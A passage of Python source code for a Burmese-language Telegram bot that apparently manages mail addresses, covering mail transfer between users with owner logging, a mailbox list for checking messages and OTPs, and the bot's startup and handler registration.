            create_or_update_user(uid, state="CLEAR")
            update.message.reply_text("❌ မအောင်မြင်ပါ‹ အဆိုပါမေးလ်သည် သင့်ထံတွင် ရှိမနေပါ‹ /start မှ ပြန်စပါ‹")
            return
        context.user_data["tmp_xfer_mail"] = input_email
        create_or_update_user(uid, state="WAIT_XFER_USER")
        update.message.reply_text(f"📦 <b>Mail လွှဲပြောင်းရန် (/transfer) - [အဆင့် ၂]</b>\n\nမေးလ် <code>{html.escape(input_email)}</code> ကို လက်ခံမည့်သူ၏ <b>Telegram ID (သို့မဟုတ် @ ပါသော Username)</b> ကို ရိုက်ထည့်ပေးပါရန် -", parse_mode="HTML")

    elif state == "WAIT_XFER_USER":
        target_email = context.user_data.get("tmp_xfer_mail")
        create_or_update_user(uid, state="CLEAR")
        if not target_email:
            update.message.reply_text("❌ စနစ်ချို့ယွင်းချက်ရှိပါသည်‹ /start ပြန်လုပ်ပါ‹")
            return
        receiver_input = text
        new_owner = None
        if receiver_input.startswith("@"):
            new_owner = get_id_by_username(receiver_input)
            if not new_owner:
                update.message.reply_text("❌ အဆိုပါ Username ပိုင်ရှင်သည် ဤ Bot အား တစ်ကြိမ်မျှ မသုံးစွဲဖူးသေးသဖြင့် စနစ်ထဲတွင် ရှာမတွေ့ပါ‹")
                return
        else:
            try: new_owner = int(receiver_input)
            except:
                update.message.reply_text("❌ ID နံပါတ် မှားယွင်းနေပါသည်‹ /start မှ ပြန်စပါ‹")
                return
        if change_mail_owner_by_email(target_email, uid, new_owner):
            update.message.reply_text(f"✅ မေးလ် <code>{html.escape(target_email)}</code> အား အသုံးပြုသူထံ အောင်မြင်စွာ လွှဲပြောင်းပေးပြီးပါပြီ‹", parse_mode="HTML")
            try: context.bot.send_message(chat_id=new_owner, text=f"📦 <b>သင့်ထံသို့ မေးလ်အသစ်တစ်ခု လွှဲပြောင်းရောက်ရှိလာပါသည်‹</b>\n📩 Mail: <code>{target_email}</code>\n/id ကိုနှိပ်ပြီး စစ်ဆေးနိုင်ပါပြီဗျာ‹", parse_mode="HTML")
            except: pass

            try:
                context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"📦 **Mail Transfer Log**\n👤 From: @{uname} (ID: `{uid}`)\n➡️ To Receiver ID/User: `{receiver_input}` (ID: `{new_owner}`)\n📩 Transferred Mail: `{target_email}`",
                    parse_mode="Markdown"
                )
            except: pass
        else:
            update.message.reply_text("❌ လွှဲပြောင်းခြင်း မအောင်မြင်ပါ‹")

def id_command_shortcut(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    status = get_user_status(uid)
    if not status or not status[0]: return
    create_or_update_user(uid, state="CLEAR")
    mails = get_my_mails(uid)
    if not mails:
        update.message.reply_text("သင့်ထံတွင် လက်ရှိ ဆောက်ထားသော မေးလ်မရှိသေးပါ‹")
        return
    text = "📂 <b>သင့်ကိုယ်ပိုင် မေးလ်စာရင်း (/id)</b>\n\nစာ/OTP စစ်ဆေးလိုသော မေးလ်လိပ်စာအောက်ရှိ ခလုတ်ကို နှိပ်ပါ -"
    keyboard = []
    for mail_id, email in mails:
        keyboard.append([InlineKeyboardButton(f"📩 {html.escape(email)}", callback_data=f"view_{mail_id}")])
    keyboard.append([InlineKeyboardButton("⬅️ Main Menu သို့", callback_data="go_to_main")])
    update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

# ================= MAIN RUNNER =================
def main():
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    print("Keep-Alive Web Server Started successfully...")

    request_kwargs = {'proxy_url': 'http://proxy.server:3128/', 'connect_timeout': 15.0, 'read_timeout': 15.0}
    updater = Updater(token=BOT_TOKEN, request_kwargs=request_kwargs, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("id", id_command_shortcut))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(MessageHandler(Filters.contact, handle_contact))
    dp.add_handler(CallbackQueryHandler(button_click_handler))

    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, log_all_text_messages))
    dp.add_handler(MessageHandler(Filters.photo, log_all_photos))

    print("Stable Mail Bot [ALL PTB VERSION ERRORS FIXED] & Running successfully on PythonAnywhere...")

    while True:
        try:
            updater.start_polling(drop_pending_updates=True)
            updater.idle()
        except Exception as e:
            print(f"Bot ရပ်သွားသဖြင့် ၅ စက္ကန့်အတွင်း ပြန်လည်နှိုးပါမည်: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
